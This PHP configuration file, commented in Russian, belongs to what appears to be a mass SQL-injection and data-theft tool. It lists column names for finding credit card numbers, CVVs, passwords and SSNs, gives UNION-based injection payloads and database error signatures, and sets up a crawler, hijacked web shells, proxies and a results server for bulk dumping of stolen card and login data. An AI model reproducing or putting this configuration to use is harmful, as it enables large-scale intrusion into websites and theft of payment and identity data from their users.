<?php

// Для поиска нужных таблиц

$this->cards = array('cvv','_card','cvc','card_num','card num','credit_card','card_number','cccode','expiration','card_ccv','cc_code','cc_holder','cc_type','card_exp','exp_card','exp_year','numcc','ccnum','cc_num','cc num','num_cc','number_cc','numbers_cc','creditcard');
$this->passwords = array('pass','pw','password','psw','pais','parol','clave','pword','contraseña','hash','mdp','heslo','lösenord','pwd','jelszo','senha');
$this->logins = array('login','logan');
$this->ssn_dob = array('ssn','dob','social_security_number','social-security-number','socialsecuritynumber','mmn');

//Ошибки которые при предварительном тестировании говорят нам что тут есть скуля, самый простой способ определения ErrorBased

$this->error_text_mysql = array('require_','file_get_contents','fopen','include(','mysql_result','mysql_fetch_array','execute query','mysql_fetch_object','mysql_num_rows','mysql_fetch_assoc','mysql_fetch_row','Fatal error','Syntax error','MySQL','at line','in your SQL syntax','Database query error','Syntax error');

//Теже самые ошибки чуток обрезанные для определния sqli инъекций в заголовках ПОСТ формах

$this->error_text_mysql_head = array('file_get_contents','fopen','mysql_result','mysql_fetch_array','execute query','mysql_fetch_object','mysql_num_rows','mysql_fetch_assoc','mysql_fetch_row','Fatal error','Syntax error','in your SQL syntax','Database query error');

//'Microsoft OLE DB Provider',

$this->error_text_mssql = array('Unclosed quotation mark','Database error on page','Incorrect syntax near','Server Error in','Detailed Error','Microsoft JET Database Engine error','Syntax error (missing operator)');

$this->engeen_addr = array('tube','google','act=Help','module=help','name=News','name=Pages','name=Content','option=com','option=com_content','viewtopic.php','thread.php','showtopic=','showthread.php');
$this->engeen_addr_site = array('vk.ru','vkontakte.ru','google.com','mail.ru','od.com','yahoo.com','hotmail.com','vk.com','yandex.ru','ya.ru');

$this->konec_for_chek = array('+AND+1=1','%27+AND+%27x%27=%27x','%22+AND+%22x%22=%22x');

$this->variant_query = 
	array('1'=>array(
	//array("1111111111111'+UNION+SELECT+","+and+'0'='0"),
	array("1111111111111' UNION SELECT ",'-- +'),
	array('1111111111111+UNION+SELECT+','+--+'),
	array("1111111111111%27+UNION+SELECT+","+--+/*+order+by+%27as"),
	array('1111111111111%22+UNION+SELECT+','+--+/*+order+by+%22as'),
	//array("1111111111%27+and+","+and+%271%27=%271"),
	));

$this->variant_query_mssql = 
	array('1'=>array(
	array('1111111111111+UNION+SELECT+',''),
	array('1111111111111+UNION+SELECT+',"--"),
	//array("1111111111%27+and+","+and+%271%27=%271")
	));

$this->h_s = array(
	'url'=>'',
	'referer'=>'google.com',
	'useragent'=>'mozilla',
	'forwarder'=>'8.8.8.8',
	'cookies'=>'User=admin&;password=123&;login=admin',
	'post_static'=>'',
	'cookies_static'=>'',
	'head'=>'',
	'post'=>'',
	'https'=>false);

$this->action_new = '';
$this->paginate = array('limit' => 250,'order' => array('id' => 'desc'));
$this->stopword = array('trial','TRIAL','null','NULL','nul','NUL','','0','test','yes','no','not cached','RJDBP4');
$this->path = array();
$this->card_dubles = array();
$this->valid_socks = array();
$this->ssb_dob = array();

$this->preg_table = false;
$this->preg_login = false;
$this->preg_pass  = false;

// для одиночного дампинга

$this->mysql2 = false;
$this->default_dirs = false;

$this->check_post_form=0;
$this->domen = '';
$this->shell_url = '';
$this->connection ='';
$this->corp = '';
$this->corp_good = '';
$this->tableOrder = '';

$this->shag = 15;
$this->plus = 10;
$this->lim  = 500000;
$this->lim2  = 500000;
$this->raz = 1000;
$this->delete = 500;
$this->psn = 10000;
$this->pid = 0;

$this->keyword;
$this->key_word;
$this->keyword_count = 0;
$this->method = false;
$this->column = false;
$this->user = false;
$this->version = false;
$this->work = false;
$this->urls = array();
$this->sposob = false;
$this->get_by_error = false;
$this->get_by_error_leght = 0;

//функции для метода TIME BASED(SLEEP)

$this->id = '';
$this->url = '';
$this->set = '';
$this->tmp = '';
$this->ret = array();
$this->ar_sql = array();
$this->scnd = '';
$this->sec ='';
$this->data = array();
$this->sqli = array();
$this->array_sql = array();
$this->sqli_config = array();
$this->dbs = '';
$this->table = '';
$this->tables = '';
$this->count_tables = '';
$this->columns = '';
$this->comment = '';
$this->sleep_check1 = true;
$this->sleep_check2 = false;
$this->sleep_metod = false;
$this->sleep_data = '';
$this->proxy = '';
$this->error = 0;

// desc

$this->desc = 0;
$this->desc_enable = false;
$this->dumpfile = false;
$this->null = 0;

//для какого метода по заливке через sleep

$this->method_old =false;

//функции для паука
$this->getform='';
$this->postform='';
$this->form_url = '';
$this->form_host = '';
$this->form_set = array();
$this->sleep = 1;
$this->tables_find = 0;
$this->logging = 1;
$this->file = '';
$this->crowler = false;
$this->crowler_url ='';
$this->l1 = array();
$this->l2 = array();
$this->l1_main = array();
$this->l1_google = array();
$this->a1 = array();
$this->a2 = array();
$this->find = '';
$this->mssql = false;
$this->sitemap = false;
$this->what_to_find = '';
$this->bad_body = 0;

//Cлужебные функции

$this->https = false;

// если страница 2 раза отдасться пустой, то взлом прекратится, может домен не существует или что то еще.

$this->content_empty = 0;

//была ли пройдена проверка на https

$this->https_check=false;

//будущая заготовка для ПОСТ форм проверять отправкой готовых данных для руч

$this->post_full = false;

///ДОМЕНЫ

// Время выполнения POST запроса при тестировании на Удаленном шеле
//$this->time_eval = 220;
//$this->timeout = 20;
//$this->time_sleep2 = 30;

// чек доменов на определение сколько будет таймаут, когда определяет https и http

$this->time_check_domens = 30;

//Время выполнения POST запроса при error_finder на Удаленном шеле. CURL передает

$this->time_crowler = 400;
$this->time2_main = 25;	//время для первой страницы
$this->time_sleep = 30;

$this->limit_crawler = 1500;	//общее количество линком скок может пройти паук ДЛЯ СРЕДНЕГО ВЗЛОМА ЕСЛИ НУЖНО КАЧЕСТВЕННО ПРЯМ СКАНИТЬ ТО МОЖНО И 10К ПОСТАВИТЬ
$this->limit_page0 = 350;	// количество ссылок с первой страницы, чтобы пауку было куда бежать
$this->l1_main_form_slice = 50;	// далее паук собер линков N с главной страницы и по этим линкам будут искаться формы
$this->limit_page_inj_test = 50;	// К примеру паук собрал 1000 линков, сколько ему нужно будет проверить на возможную скулю
$this->count_links_good_get_return = 2;	// количество ссылок при при работает паука при котором он будет прекращать искать потенциальные имено GET линки
$this->count_links_good_post_return = 2;	// количество форм успешных найденны при при работает паука при котором он будет прекращать искать потенциальные формы именно POST

// GET AND POST у паука

$this->get_check=true;	// будет ли проверять паук get ссылки. Может для отладки потребоваться. ЕСЛИ FALSE ПОСТАВИТЬ ТО БУДЕТ ЛОМАТЬ ТОЛЬКО ФОРМЫ
$this->post_check = true;	// будет ли паук проверять формы
$this->error_limit_check = 500;	// прежде чем они будут проверяться, нужно определить www. есть и какой протокол
$this->error_limit_domen =500;	// количество доменов за ра сколько будет проверяться  мультикурлом

//ЧЕКИНГ ССЫЛОК

$this->error_limit = 5000;	// проверять разом ссылок сколько в предварительном тестировании оптимально 2000-5000
$this->multi_limit = 300;	// уже второй шаг чек на колонки подключение к БД вывод версии, крутит долго. Можно поиграться с параметром.
$this->error_limit_all = 5000;	// проверять разом ссылок сколько в предварительном тестировании оптимально 2000-5000 в ТАБЛИЦЕ POSTS_ALL тут могут быть дубликаты много ссылок С ДОМЕНА
$this->multi_limit_all = 300;	// уже второй шаг чек на колонки подключение к БД вывод версии, крутит долго. Можно поиграться с параметром. POSTS_ALL таблицы, много ссылок С ДОМЕНА

$this->table_post = 'posts_all';	// таблицу куда будут все формы складываться и чекаться больше 1 ссылок с домена
$this->table_main = 'posts';

$this->error_time = 130;	// сколько ждать времени по отдаче с шелла при предварительном тестировании stepOne
$this->multi_time = 250;	// сколько ждать времени по отдаче с шелла при уже полноценном чеке, подборе колонок и прочее stepTwo, 150 ставил явно очень мало, пропуски идут
$this->column_limit = 50;	// сколько колонок проверять при подборе

$this->dump_all_potok =2;	// во сколько потоков будет делаться выкачка всей таблицы

$this->check_shell_limit = 950;	// количество за раз сколько будет пытаться чекать шелов из файла shelllist.txt
$this->time_200 = 30;	// сначала шеллы чекаются на 200 ОК к каждому url прибавляется ?q=1 и если 200 ответ то живой. Он уже взламывается
$this->evallife = 60;	// тамайут при чекинге шелла по url из файла ololo.php уже сам взлом
$this->potok_dump_one = 70000;	// сколько за раз будет качать один поток, если больше этой цыфры будет база, то качать будет в 6 потоков биться
$this->card_min = 500;
$this->link_count = 30;	// Количество ссылок добвляемых через форму ADD МНОГО ЛИНКОВ ПО ДОМЕНУ ЕСЛИ ДЕЛАТЬ. 3-10 достаточно. а то дохера будет сканировать по времени

$this->add_one_domen=false;

// включение различных проверок

$this->ssn_check = true;	// включить поиск SSN если нужен
$this->cc_check = true;	// включить поиск СС
$this->search_email = true;	// включить поиск емайлов на третьем шаге, может кто то только по картам работает
$this->pass_salt_check_only = false;	// БУДЕТ КАЧАТЬ ТОЛЬКО ГДЕ ЕСТЬ ПАСС С СОЛЬЮ ИМЕННО ИХ. ДЛЯ ПЕРЕКАЧКИ К ПРИМЕРУ НУЖЕН если FALSE то качает всё

// для заголовков

$this->header = false;	// возвращать заголовки в CURL
$this->head_enable = false;	// Явно говорит что идет работа с ЗАГЛОВКАМИ COOKIES и в том числе c POST

// переменная нужна для проверки на скули при сборе form пауком
// При переборе через inject в start не пускает до метода sqli() временная переменная или частичная

$this->form_enable =false;

//GET INJECT_TEST

$this->type_sposob_mysql_error=true;
$this->type_sposob_mysql_boolean=true;
$this->type_sposob_mysql_sqli=true;

//HEAD INJECT_TEST

$this->type_sposob_mysql_error_head=true;
$this->type_sposob_mysql_sqli_head=true;

//GET AND POST INJECT - подбор колонок когда идет, способы

$this->type_sposob_union=true;
$this->type_sposob_sleep=true;
$this->type_sposob_FindErrorSqlNew=true;
$this->type_sposob_FindErrorSql=true;

$this->head_check  = false;	// включить проверять заголовки COOKIES USERAGENT
$this->mssql_check = true;	// включить проверку mssql В ПРОЦЕССЕ  НАПИСАНИЯ

//функции отвечают за вывод полезной информации

$this->log_enable = true;	// Просто вывод на страницу лайтовый, вывод sql запросов
$this->debug =false;	// более полный вывод иногда с полностью загруженной страницей для дебага
$this->debug_full_content=false;	//ну прям ваще полный с выводом удаленной страницы.
$this->debug_proxy=false;

//Метод для отображения информации, обволакивает символы в ту или иную конструкцию CHAR HEX IFNULL
//Ломается какой один берется наиболее оптимальный

$this->method_auto =true;	// будет ломаться двумя способами по очереди, если тут включаете TRUE то тогда hex и char поставьте false
$this->method_hex = false;	// для включения взлома через HEX второй ставьте FALSE работать будет или тот и ли этот
$this->method_char = false;
$this->method_ifnull = false;

//Метод обработки URL --decode

$this->url_encode_auto = false;
$this->url_encode = true;

//Функции отвечающие за прокси, лучше не использовать пробив падает на 30%

$this->proxy_enable = false;	// Прокси если с пасом то делать ip:port:login:pass
$this->proxy_url = 'proxy.txt';	// app/webroot/socks.txt СЮДА HTTP прокси имено
$this->url = "http://google.com";	// Сайт на какой чекается прокси
$this->url2 = "http://www.msu.ru";	// Запасной сайт для чека прокси второй
$this->text = "title";	// Если такое слово найдет при заходе через прокси на сайт, то значит рабочий
$this->uagent = "";
$this->referer = "google.ru";
$this->proxy_check_full = true;	// Этот параметр отвечает за проверку проксей в более широком формате на реальном взломе как шеллы
$this->proxy_url_full_check ='post::http://testphp.vulnweb.com/userinfo.php?uname=test&pass=test';
$this->proxy_answer = 'mysql_fetch_array';	// Если меняете линк . Берете какой либо из уязвимых то и ответ сюда вставляйте из колонки find

//Функции проверки шеллов

$this->local_shells = false;	// если вы будете использовать файлик для взлома на своих серверах, но вы можете размножить один и тот же файл(false), в противном случае дубли удаляться true

// не забудь указать в app/webroot/local_shells   типа так http://IP/get_post.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG и выключить htaccess авторизацию, ЕСЛИ TRUE то будут всё работать через локл шеллы, если false то ДОМЕНЫ будут через локальные шеллы, а чекин ссылок идти через чужие

$this->server_url = 'IP SERVER';//важный параметр впиште ваш IP куда будут слаться результат. Просто доменное имя (IP)без http:// и без слеша в конце

//$this->server_url  =$_SERVER['HTTP_HOST'];

$this->htaccess_auth = 'admin:admin';	// формат первой авторизации admin:pass

//Функции отвечающие за дампинг

$this->multidump_one = true;	// выключить скачку мыл через одиночный дампинг
$this->multidump_name_phone = true; // авматический перенос из основных таблиц найденных имен логинов телефоно в модуль автоматического дампинга и их скачка

$this->dump_one_good = false;	// Если будет TRUE то будет качать до упора мыло пасс, если false то если будет 20 пустых значений стопнет, TRUE то функции ниже не будут работать до упора будет
$this->up = false;	//если включито то тоже до упора будет качать кривые битые всякие мыла. ЭТО ДЛЯ МАССОВОГО ДАМПИНГА МЫЛ И МЫЛО ПАСС
$this->up_one = true;	//Новый параметр для одиночного дампинга, если TRUE то будет стараться до упора выкачать

$this->null_count = 300;	//если отдаёт прям NULL или пасс слишком короткий или стоп слова в паролях
$this->hunta=300;	// c пустым ваще значением если столько будет то поток перезапуститься
$this->pass_empty = 1750;	//с пустым пассом, если столько будет ...
$this->email_bad = 7500;	//кривые мыла если будут то...
$this->dlina = 5500;	//одинаковые по длине по мыла если идут

//БЫВШИЕ настройки из таблицы settings

$this->potok_one = 1;	// Во сколько потоков будет качаться мыло имя, мыло телефон, мыло логин, лучше не трогать
$this->dump_one =1;	//включить скачку просто МЫЛ, без пассов
$this->check_url = 1;
$this->potok =6;
$this->pass = 3;

$this->sliv_save = true;	//будут ли качаться в папку без отсеивания на дубли через БД
$this->sliv_pass_save = true;

$this->dump_all_sib = true;
$this->sqlmap_check = false;	// ЕСЛИ ВКЛЮЧЕНА ДАННАЯ ОПЦИЯ ТО ЧЕРЕЗ ОБЫЧНЫЙ ВЗЛОМ НЕ БУДУТ ПРОВЕРЯТЬСЯ ЛИНКИ КОТОРЫЕ ПОМЕЧЕНЫ КАК НА ЧЕК ТОЛЬКО ЧЕРЕЗ SQLMAP
?>